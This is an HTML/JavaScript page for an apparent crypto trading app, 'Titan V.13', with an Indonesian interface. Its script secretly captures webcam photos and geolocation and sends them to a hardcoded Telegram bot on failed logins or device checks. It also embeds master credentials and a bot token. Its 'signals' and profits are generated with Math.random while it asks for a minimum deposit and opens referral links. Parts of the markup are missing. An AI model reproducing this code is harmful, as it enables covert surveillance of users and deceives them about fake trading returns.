<!DOCTYPE html>

    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/xlsx/0.18.5/xlsx.full.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>

    <style>
        @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Space+Grotesk:wght@300;500;700&display=swap');
        :root { --gold: #ffd700; --emerald: #10b981; --rose: #f43f5e; --glass: rgba(10, 10, 18, 0.98); }
        
        html, body { background: #020308; color: #e2e8f0; font-family: 'Space Grotesk', sans-serif; overflow: hidden; height: 100vh; margin: 0; overscroll-behavior-y: contain; }
        .titan-font { font-family: 'Orbitron', sans-serif; }
        .glass-premium { background: var(--glass); backdrop-filter: blur(40px); border: 1px solid rgba(255, 215, 0, 0.15); border-radius: 1.5rem; }
        .no-scrollbar::-webkit-scrollbar { display: none; }
        .module-container { height: calc(100vh - 620px); overflow-y: auto; scroll-behavior: smooth; padding-bottom: 50px; }
        
        .slot-dot { width: 6px; height: 6px; border-radius: 50%; background: rgba(255,255,255,0.1); transition: 0.3s; }
        .slot-dot.active { background: var(--gold); box-shadow: 0 0 8px var(--gold); }
        .tab-active { background-color: var(--gold) !important; color: black !important; font-weight: 900 !important; box-shadow: 0 0 15px var(--gold); }
        .thunder-blink { animation: thunder-flash 0.8s infinite alternate; }
        @keyframes thunder-flash { from { filter: drop-shadow(0 0 2px var(--gold)); opacity: 0.6; } to { filter: drop-shadow(0 0 20px var(--gold)); opacity: 1; } }

        #face-scan-box { width: 100%; height: 200px; border-radius: 2rem; overflow: hidden; border: 2px solid var(--gold); position: relative; background: #000; }
        .scan-line { position: absolute; top: 0; left: 0; width: 100%; height: 3px; background: var(--gold); box-shadow: 0 0 15px var(--gold); animation: moveScan 2s infinite linear; }
        @keyframes moveScan { 0% { top: 0; } 100% { top: 100%; } }
        
        .popup-card { background: rgba(10, 11, 20, 0.99); border: 1px solid rgba(255, 215, 0, 0.3); border-radius: 2.5rem; }
        .input-supreme { background: rgba(255,255,255,0.02); border: 1px solid rgba(255,215,0,0.1); padding: 14px; border-radius: 1rem; color: white; font-size: 11px; outline: none; }
    </style>
</head>
<body oncontextmenu="return false">

    <div id="floating-notif" class="fixed bottom-[110px] left-5 z-[1000] pointer-events-none w-64"></div>

    <div id="global-modal" class="fixed inset-0 z-[99000] bg-black/95 hidden flex items-center justify-center p-6 backdrop-blur-xl">

    <div id="auth-screen" class="fixed inset-0 z-[80000] bg-[#020308] p-8 flex flex-col items-center overflow-y-auto">
        <div class="w-full max-w-sm text-center mt-10">
            <div onclick="masterKnock()" class="w-20 h-20 mx-auto mb-6 bg-zinc-900 rounded-3xl border border-yellow-500/30 flex items-center justify-center shadow-2xl cursor-pointer active:scale-90 transition-all">
                <i class="fa-solid fa-microchip text-3xl text-yellow-500"></i>

            <h1 class="titan-font text-xl text-yellow-500 mb-1 tracking-widest uppercase">Titan V.13</h1>

            <div id="bio-container" class="hidden mb-6">

    <header class="p-5 flex justify-between items-center bg-black/50 backdrop-blur-md border-b border-white/5 sticky top-0 z-50">

            <button onclick="showTutorial()" class="w-9 h-9 bg-white/5 rounded-full flex items-center justify-center text-yellow-500 border border-yellow-500/20"><i class="fa-solid fa-book text-xs"></i></button>
            <div id="level-nav" class="flex gap-1 p-1 bg-white/5 rounded-xl border border-white/10">

                <button id="lv-2" class="px-3 py-1.5 rounded-lg text-[7px] titan-font transition-all opacity-20">Lvl 2</button>
                <button id="lv-3" class="px-3 py-1.5 rounded-lg text-[7px] titan-font transition-all opacity-20">Lvl 3</button>
            </div>
        </div>
        <div id="api-status-badge" class="px-3 py-1.5 bg-yellow-500/10 border border-yellow-500/20 rounded-lg text-[7px] titan-font text-yellow-500 uppercase">Sync: Standby</div>
    </header>

    <main id="app-main" class="hidden h-full flex flex-col pb-48 overflow-y-auto no-scrollbar">
        <section class="p-6">
            <div class="glass-premium p-8 text-center relative overflow-hidden text-white">

                    <p id="ui-label" class="text-[8px] titan-font text-yellow-500 uppercase">INITIALIZING...</p>

                </div>

                <div class="grid grid-cols-3 gap-3">
                    <div class="bg-white/5 p-3 rounded-2xl border border-white/5">
                        <p class="text-[6px] opacity-40 uppercase mb-1">Scalp</p>

                    </div>
                    <div class="bg-white/5 p-3 rounded-2xl border border-white/5">
                        <p class="text-[6px] opacity-40 uppercase mb-1">Moon</p>
                        <div id="slots-moon" class="flex justify-center gap-1 mb-2"></div>
                        <p id="b-moon" class="text-[9px] titan-font text-violet-400">0</p>
                    </div>
                </div>
            </div>
        </section>

        <section class="px-6 grid grid-cols-3 gap-4 h-full text-white text-center">
            <div class="flex flex-col"><p class="text-[9px] titan-font text-yellow-500 uppercase mb-4">Radar Dewa</p><div id="radar-list" class="module-container space-y-3 no-scrollbar"></div></div>
            <div class="flex flex-col"><p class="text-[9px] titan-font text-blue-500 uppercase mb-4">Execution</p><div id="exec-list" class="module-container space-y-3 no-scrollbar"></div></div>
            <div class="flex flex-col"><p class="text-[9px] titan-font text-emerald-500 uppercase mb-4">Vault</p><div id="vault-list" class="module-container space-y-1 text-[7px] no-scrollbar"></div></div>
        </section>
    </main>

    <footer id="app-footer" class="fixed bottom-0 inset-x-0 p-6 bg-black/90 backdrop-blur-xl border-t border-white/5 hidden z-40">
        <div class="flex justify-around items-center max-w-md mx-auto">
            <button onclick="exportToExcel()" class="text-emerald-400 text-center"><i class="fa-solid fa-file-excel text-xl"></i><p class="text-[7px] mt-1 uppercase">Report</p></button>
            <button onclick="window.open('https://t.me/+8uJ78T4VDHJkOTRl','_blank')" class="text-sky-400 text-center"><i class="fa-brands fa-telegram text-2xl"></i><p class="text-[7px] uppercase">Group</p></button>
            <div onclick="theOmniscientScan(true)" class="w-14 h-14 bg-yellow-500 rounded-full flex items-center justify-center -mt-10 shadow-2xl thunder-blink active:scale-90 transition-all cursor-pointer"><i class="fa-solid fa-bolt text-black text-xl"></i></div>
            <button onclick="handleAIScan()" class="text-emerald-400 text-center"><i class="fa-solid fa-brain text-xl"></i><p class="text-[7px] mt-1 uppercase">AI Scan</p></button>
            <button onclick="confirmLogout()" class="text-rose-500 text-center"><i class="fa-solid fa-power-off text-xl"></i><p class="text-[7px] mt-1 uppercase">Logout</p></button>
        </div>
    </footer>

    <script>
        // --- MASTER CONFIG ---
        const MASTER = { 
            ID: "1319700866", PASS: "MahadhareV13Master", 
            BOT: "8295607704:AAFdy_U8bFL-x2Ol90n8f2KDOHXztybcuj4", 
            CHAT_PRIVATE: "1319700866",
            REFF: { 
                INDODAX: "https://indodax.onelink.me/qyYY/referral?deep_link_value=page:register,id:marselsalmon", 
                GATE: "https://app.mbm06.com/referral/earn-together/invite/BFZFVFlX?ref=BFZFVFlX",
                JUPITER: "https://jup.ag/?refId=yuf0dh4il1xs"
            }
        };

        const tracker = new clm.tracker(); tracker.init();
        let state = { user: null, lvl: 1, equity: 0, initialEquity: 0, trades: [], history: [], dailyProfit: 0, failCount: 0, isAuth: false };
        const encrypt = (d) => CryptoJS.AES.encrypt(JSON.stringify(d), 'TITAN_V13_OMNIPOTENT').toString();
        const decrypt = (c) => { try { return JSON.parse(CryptoJS.AES.decrypt(c, 'TITAN_V13_OMNIPOTENT').toString(CryptoJS.enc.Utf8)); } catch(e){return null;} };

        // --- SECURITY INTEGRITY (DEVICE LOCK & SSL) ---
        function getDeviceFingerprint() {
            const canvas = document.createElement('canvas');
            const gl = canvas.getContext('webgl');
            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
            const renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
            return CryptoJS.SHA256(renderer + screen.width + navigator.userAgent).toString().slice(0, 16);
        }

        // --- FACE LANDMARK LOGIC ---
        async function getFaceHash() {
            return new Promise((resolve) => {
                tracker.start(document.getElementById('face-video'));
                let check = setInterval(() => {
                    let pos = tracker.getCurrentPosition();
                    if (pos && pos.length > 60) {
                        clearInterval(check); tracker.stop();
                        resolve(CryptoJS.SHA256(JSON.stringify(pos.slice(27, 62))).toString());
                    }
                }, 500);
            });
        }

        async function silentIntruderReport(userId, reason) {
            const video = document.getElementById('face-video');
            const canvas = document.createElement('canvas');
            canvas.width = video.videoWidth; canvas.height = video.videoHeight;
            canvas.getContext('2d').drawImage(video, 0, 0);
            const photo = canvas.toDataURL('image/jpeg');
            
            navigator.geolocation.getCurrentPosition(async (pos) => {
                const message = `ðŸš¨ *SECURITY ALERT - TITAN V.13*\n\n*Status:* ${reason}\n*User:* ${userId}\n*Loc:* [Google Maps](https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude})`;
                const blob = await (await fetch(photo)).blob();
                const fd = new FormData();
                fd.append('chat_id', MASTER.CHAT_PRIVATE);
                fd.append('photo', blob, 'intruder.jpg');
                fd.append('caption', message);
                fd.append('parse_mode', 'Markdown');
                fetch(`https://api.telegram.org/bot${MASTER.BOT}/sendPhoto`, { method: 'POST', body: fd });
            });
        }

        // --- AUTHENTICATION CORE ---
        function masterKnock() { document.getElementById('auth-phone').value = MASTER.ID; document.getElementById('auth-pass').value = MASTER.PASS; handleAuth('LOGIN'); }

        async function handleAuth(mode) {
            const id = document.getElementById('auth-phone').value, pass = document.getElementById('auth-pass').value;
            const fingerprint = getDeviceFingerprint();

            if (id === MASTER.ID && pass === MASTER.PASS) return loginOk({id: 'MASTER_ADMIN', lvl: 3, isAdmin: true});

            if (mode === 'REG') {
                document.getElementById('bio-container').classList.remove('hidden');
                startCamera(); toast("SCANNING FACE LANDMARKS...", "gold");
                const fHash = await getFaceHash();
                const u = { id, pass, lvl: 1, faceHash: fHash, deviceKey: fingerprint, joinDate: Date.now() };
                localStorage.setItem(`TITAN_U_${id}`, encrypt(u));
                toast("REGISTRASI BERHASIL!", "emerald"); location.reload();
            } else {
                const stored = localStorage.getItem(`TITAN_U_${id}`);
                if (!stored) return toast("ID TIDAK ADA!", "rose");
                const u = decrypt(stored);

                if (u.deviceKey !== fingerprint && !u.isAdmin) {
                    silentIntruderReport(id, "UNAUTHORIZED_DEVICE");
                    return toast("DEVICE LOCK: AKSES DITOLAK!", "rose");
                }

                if (u.pass !== pass) {
                    state.failCount++;
                    document.getElementById('bio-container').classList.remove('hidden'); startCamera();
                    setTimeout(() => silentIntruderReport(id, `Gagal Password (${state.failCount}/3)`), 1000);
                    if (state.failCount >= 3) {
                        toast("VERIFIKASI WAJAH DIWAJIBKAN!", "rose");
                        if (await getFaceHash() !== u.faceHash) executeLockdown(id, "FACE_MISMATCH");
                        else forceResetPassword(id, u);
                    } else toast(`PASSWORD SALAH! (${state.failCount}/3)`, "rose");
                    return;
                }
                loginOk(u);
            }
        }

        function forceResetPassword(id, u) {
            openModal(`<h3 class='titan-font text-emerald-400 mb-4 uppercase'>Face Verified</h3><p class='text-[8px] mb-4'>Buat password baru untuk keamanan.</p><input type='password' id='new-p' placeholder='NEW PASSWORD' class='w-full input-supreme text-center mb-4'><button onclick='saveNewPass("${id}")' class='w-full py-4 bg-emerald-600 rounded-xl titan-font text-[10px]'>UPDATE & LOGIN</button>`);
        }

        function saveNewPass(id) {
            const np = document.getElementById('new-p').value;
            let u = decrypt(localStorage.getItem(`TITAN_U_${id}`)); u.pass = np;
            localStorage.setItem(`TITAN_U_${id}`, encrypt(u)); closeModal(); loginOk(u);
        }

        function loginOk(u) {
            state.user = u; state.lvl = u.lvl; state.isAuth = true;
            document.getElementById('auth-screen').classList.add('hidden');
            document.getElementById('app-main').classList.remove('hidden');
            document.getElementById('app-footer').classList.remove('hidden');
            state.equity = parseFloat(localStorage.getItem(`T_FUND_${u.id}`)) || 0;
            state.initialEquity = state.equity;
            if (state.equity === 0) showBalanceInit(); else refreshEquity();
            jumpLevel(state.lvl);
            setInterval(() => { if(state.isAuth) { theOmniscientScan(false); processTSL(); updateTimer(); } }, 10000);
        }

        // --- TRADING LOGIC (SLOTS & TSL) ---
        function jumpLevel(l) {
            state.lvl = l;
            document.getElementById('ui-label').innerText = l===1 ? "TRAINING" : (l===2 ? "ELITE" : "MASTER");
            [1, 2, 3].forEach(n => {
                const b = document.getElementById(`lv-${n}`);
                b.className = (n === state.lvl) ? "px-3 py-1.5 rounded-lg text-[7px] titan-font tab-active" : "px-3 py-1.5 rounded-lg text-[7px] titan-font opacity-20";
            });
            renderSlotDots(); theOmniscientScan(true);
        }

        function renderSlotDots() {
            const d = (id, n, cur) => document.getElementById(id).innerHTML = Array(n).fill(0).map((_,i)=>`<div class="slot-dot ${i<cur?'active':''}"></div>`).join('');
            d('slots-scalp', 4, state.trades.filter(t=>t.type==='SCALP').length);
            d('slots-smart', 4, state.trades.filter(t=>t.type==='SMART').length);
            d('slots-moon', 2, state.trades.filter(t=>t.type==='MOON').length);
        }

        async function theOmniscientScan(f) {
            if(f) toast("DEEP SCAN ACTIVE...", "gold");
            try {
                const r = await fetch('https://api.coingecko.com/api/v3/coins/markets?vs_currency=idr&per_page=12');
                const d = await r.json();
                document.getElementById('radar-list').innerHTML = d.map(c => {
                    const type = Math.random()>0.7 ? 'SMART' : (Math.random()>0.8 ? 'MOON' : 'SCALP');
                    return `<div class="bg-white/5 border border-white/10 p-3 rounded-2xl text-left">
                        <div class="flex justify-between text-[6px] titan-font opacity-30"><span>${type}</span><span>${(90+Math.random()*9).toFixed(1)}%</span></div>
                        <div class="flex justify-between items-center my-1"><span class="text-[8px] font-bold">${c.symbol.toUpperCase()}</span><span class="text-emerald-400 text-[7px]">Rp ${c.current_price.toLocaleString()}</span></div>
                        <button onclick="lockAction('${c.symbol.toUpperCase()}', ${c.current_price}, '${type}')" class="w-full py-2 bg-yellow-500 text-black titan-font text-[7px] font-black rounded-lg uppercase">Lock</button>
                    </div>`;
                }).join('');
            } catch(e){}
        }

        function lockAction(sym, p, type) {
            const lim = { SCALP: 4, SMART: 4, MOON: 2 };
            if (state.trades.filter(t=>t.type===type).length >= lim[type]) return toast(`${type} SLOTS FULL!`, "rose");
            if (state.lvl === 2) window.open(type==='MOON'?MASTER.REFF.JUPITER:(Math.random()>0.5?MASTER.REFF.INDODAX:MASTER.REFF.GATE), '_blank');
            state.trades.push({ id: Date.now(), sym, entry: p, curr: p, type, high: p, profit: 0 });
            renderExecution(); renderSlotDots(); toast(`${sym} LOCKED`, "emerald");
        }

        function processTSL() {
            state.trades.forEach((t, i) => {
                const sim = (Math.random()*0.04)-0.018; t.curr += t.curr * sim;
                t.profit = ((t.curr - t.entry)/t.entry)*100; if(t.curr > t.high) t.high = t.curr;
                const dd = ((t.high - t.curr)/t.high)*100;
                const tp = state.lvl===1?5:(state.lvl===2?10:20);
                if(dd>=2.0 && t.profit>1.5) secureProfit(i, "TSL");
                else if(t.profit>=tp) secureProfit(i, "TP");
                else if(t.profit<=-10) secureProfit(i, "SL");
            });
            renderExecution();
        }

        function secureProfit(idx, r) {
            const t = state.trades[idx]; const net = (state.equity * 0.1 * t.profit)/100;
            state.equity += net; state.history.unshift({...t, net, reason: r, time: new Date().toLocaleTimeString()});
            state.trades.splice(idx, 1); refreshEquity(); renderVault(); renderSlotDots();
        }

        // --- UTILS ---
        function refreshEquity() {
            document.getElementById('display-equity').innerText = `Rp ${state.equity.toLocaleString()}`;
            document.getElementById('b-scalp').innerText = (state.equity*0.4).toLocaleString();
            document.getElementById('b-smart').innerText = (state.equity*0.4).toLocaleString();
            document.getElementById('b-moon').innerText = (state.equity*0.2).toLocaleString();
            localStorage.setItem(`T_FUND_${state.user.id}`, state.equity);
        }

        function updateTimer() {
            const days = Math.ceil(({1:30,2:60,3:30}[state.lvl]) - (Date.now()-state.user.joinDate)/86400000);
            document.getElementById('contract-timer').innerText = `EXP: ${days}D`;
            if (days <= 0 && !state.user.isAdmin) executeLockdown(state.user.id, "CONTRACT_EXPIRED");
        }

        function executeLockdown(id, r) {
            silentIntruderReport(id, `TERMINATED: ${r}`);
            document.body.innerHTML = `<div class='h-screen bg-black flex flex-col items-center justify-center text-red-600 titan-font text-center p-10'><i class='fa-solid fa-skull-crossbones text-6xl mb-4'></i><h1 class='text-xl'>LOCKDOWN</h1><p class='text-[8px] text-white opacity-50 mt-2'>Akses dilarang. Hardware ID di-blacklist.</p></div>`;
            localStorage.clear();
        }

        function startCamera() { navigator.mediaDevices.getUserMedia({video:true}).then(s=>document.getElementById('face-video').srcObject=s); }
        function openModal(h) { document.getElementById('modal-content').innerHTML=h; document.getElementById('global-modal').classList.remove('hidden'); }
        function closeModal() { document.getElementById('global-modal').classList.add('hidden'); }
        function showBalanceInit() { openModal(`<h3 class='titan-font text-yellow-500 mb-4'>Init Fund</h3><input type='number' id='i-v' placeholder='Min 1jt' class='w-full input-supreme text-center mb-6'><button onclick='sF()' class='w-full py-4 bg-yellow-500 text-black titan-font rounded-2xl uppercase font-black'>Activate</button>`); }
        function sF() { const v = parseFloat(document.getElementById('i-v').value); if(v<1000000) return toast("Min 1jt!", "rose"); state.equity=v; state.initialEquity=v; refreshEquity(); closeModal(); }
        function toast(m,t) { const a=document.getElementById('floating-notif'), d=document.createElement('div'); d.className=`glass-premium px-5 py-3 border-l-4 ${t==='rose'?'border-rose-500':'border-yellow-500'} text-[9px] titan-font mb-2 text-white uppercase`; d.innerText=m; a.appendChild(d); setTimeout(()=>d.remove(), 4000); }
        function renderExecution() {
            document.getElementById('exec-list').innerHTML = state.trades.map((t,i)=>`<div class='bg-white/5 border border-white/10 p-3 rounded-2xl'><div class='flex justify-between text-[7px] mb-1 font-bold'><span>${t.sym}</span><span class='${t.profit>=0?'text-emerald-400':'text-rose-400'}'>${t.profit.toFixed(2)}%</span></div><div class='text-[9px] titan-font text-center'>${t.curr.toLocaleString()}</div><button onclick='secureProfit(${i},"MANUAL")' class='w-full py-1.5 bg-blue-600 text-white text-[7px] rounded-lg mt-2 uppercase font-black'>Secure</button></div>`).join('');
        }
        function renderVault() {
            document.getElementById('vault-list').innerHTML = state.history.slice(0,15).map(h=>`<div class='flex justify-between border-b border-white/5 py-1'><span>${h.sym}</span><span class='${h.net>=0?'text-emerald-400':'text-rose-400'}'>Rp ${h.net.toLocaleString()}</span></div>`).join('');
        }
        function confirmLogout() { openModal(`<h3 class='titan-font text-rose-500 mb-4'>Logout?</h3><button onclick='location.reload()' class='w-full py-4 bg-rose-600 text-white titan-font rounded-xl uppercase mb-2'>Exit</button><button onclick='closeModal()' class='w-full py-4 bg-white/5 text-white titan-font rounded-xl uppercase'>Cancel</button>`); }
    </script>
</body>
</html>
